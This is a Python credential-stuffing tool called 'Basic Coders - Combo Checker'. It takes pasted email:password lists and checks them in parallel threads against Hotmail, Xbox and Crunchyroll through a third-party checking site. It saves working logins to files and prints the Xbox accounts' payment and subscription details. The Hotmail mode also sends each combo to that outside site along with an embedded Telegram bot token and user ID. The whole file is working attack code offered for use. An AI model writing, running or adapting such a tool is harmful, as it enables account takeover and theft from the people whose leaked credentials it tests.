import requests, threading, time, sys
from queue import Queue

hits_lock = threading.Lock()

def animated_title(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def choose_mode():
    print()
    animated_title("🌐 Basic Coders - Combo Checker ⚡", 0.07)
    time.sleep(0.4)
    print("1️⃣ Hotmail Checker")
    print("2️⃣ Xbox Checker")
    print("3️⃣ Crunchyroll Checker\n")
    return input("👉 Choose Mode (1 / 2 / 3): ").strip()

def check_combo(combo, mode):
    combo = combo.strip().replace("|", ":")
    if ":" not in combo:
        return
    email, password = combo.split(":", 1)

    start = time.time()
    try:
 
        if mode == "1":
            url = "https://checkz.co/ajax/hotmail-account-checker.php"
            data = {"mailpass": f"{email}:{password}|", "TGBotToken": "8526195680:AAGkvb0498cHVxwLV-fvltWgLWKG3FlfT04", "TGUserID": "6709531208"}
            referer = "https://checkz.co/hotmail-account-checker"
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Referer": referer,
                "X-Requested-With": "XMLHttpRequest"
            }
            r = requests.post(url, headers=headers, data=data, timeout=15)
            end = time.time()
            res = r.json()
            status_code = res.get("status")
            capture_status = res.get("capture", {}).get("status", "").lower()

            if status_code == 0 and capture_status == "success":
                print(f"LIVE ✅  {email} | {password}  |  {round(end - start, 2)}s")
                with hits_lock:
                    open("Hotmail.txt", "a").write(f"{email}:{password}\n")
            elif status_code == 2:
                print(f"DEAD ❌  {email} | {password}  |  {round(end - start, 2)}s")
            elif status_code == -1:
                print(f"RETRY 🔁  {email} | {password}  |  {round(end - start, 2)}s")
            elif status_code == 1 or capture_status == "flagged":
                print(f"FLAGGED 🚫  {email} | {password}  |  {round(end - start, 2)}s")
            else:
                print(f"UNKNOWN ⚠️  {email} | {password}  |  {round(end - start, 2)}s")
    
        elif mode == "2":
            url = "https://checkz.co/ajax/xbox-account-checker.php"
            data = {
                "ajax": "1",
                "do": "check",
                "mailpass": f"{email}:{password}|",
                "delim": "|",
                "email": "0",
                "bank": "0",
                "card": "0",
                "info": "0"
            }
            referer = "https://checkz.co/xbox-account-checker"
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Referer": referer,
                "X-Requested-With": "XMLHttpRequest"
            }
            r = requests.post(url, headers=headers, data=data, timeout=15)
            end = time.time()
            res = r.json()
            status_code = res.get("status")
            capture = res.get("capture", {})
            pay = capture.get("Payment", "N/A")
            subs = capture.get("Subscriptions", "N/A")

            if status_code == 0:
                print(f"LIVE ✅  {email} | {password}  |  {round(end - start, 2)}s")
                print(f"💳 {pay}\n🎟️ {subs}\n")
                with hits_lock:
                    open("Xbox.txt", "a").write(f"{email}:{password}\n")
            elif status_code == 1:
                print(f"FREE ❌  {email} | {password}  |  {round(end - start, 2)}s")
            else:
                print(f"DEAD ❌  {email} | {password}  |  {round(end - start, 2)}s")
       
        elif mode == "3":
            url = "https://checkz.co/ajax/crunchyroll-account-checker.php"
            data = {"mailpass": f"{email}:{password}|"}
            referer = "https://checkz.co/crunchyroll-account-checker"
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Referer": referer,
                "X-Requested-With": "XMLHttpRequest"
            }
            r = requests.post(url, headers=headers, data=data, timeout=15)
            end = time.time()
            res = r.json()
            status = res.get("status")
            capture = res.get("capture", {})
            plan = capture.get("plan", "None")

            if status == 0:
                print(f"LIVE ✅  {email} | {password}  |  {round(end - start, 2)}s")
                print(f"🎟️ Plan: {plan}\n")
                with hits_lock:
                    open("Crunchyroll.txt", "a").write(f"{email}:{password}\n")
            elif status == 2:
                print(f"DEAD ❌  {email} | {password}  |  {round(end - start, 2)}s")
            else:
                print(f"UNKNOWN ⚠️  {email} | {password}  |  {round(end - start, 2)}s")

    except Exception as e:
        print(f"⚠️ Error on {combo} → {e}")

def worker(mode):
    while True:
        combo = q.get()
        if combo is None:
            break
        check_combo(combo, mode)
        q.task_done()
        
mode = choose_mode()
WORKERS = 15 if mode == "3" else 20

if mode == "1":
    animated_title("\n📧 Hotmail Checker Selected ⚡", 0.05)
elif mode == "2":
    animated_title("\n🎮 Xbox Checker Selected ⚡", 0.05)
else:
    animated_title("\n🍥 Crunchyroll Checker Selected ⚡", 0.05)

print("• Paste combos below (email:pass)")
print("• Type 'done' when finished:\n")

combos = []
while True:
    line = input()
    if line.strip().lower() == "done":
        break
    combos.append(line.strip())

print(f"\n🚀 Starting check for {len(combos)} combos using {WORKERS} threads...\n")

q = Queue()
for combo in combos:
    q.put(combo)

threads = []
for _ in range(WORKERS):
    t = threading.Thread(target=worker, args=(mode,))
    t.start()
    threads.append(t)

q.join()
for _ in range(WORKERS):
    q.put(None)
for t in threads:
    t.join()

if mode == "1":
    print("\n✅ Hotmail check completed! LIVE hits saved in Hotmail.txt\n")
elif mode == "2":
    print("\n✅ Xbox check completed! LIVE hits saved in Xbox.txt\n")
else:
    print("\n✅ Crunchyroll check completed! LIVE hits saved in Crunchyroll.txt\n")
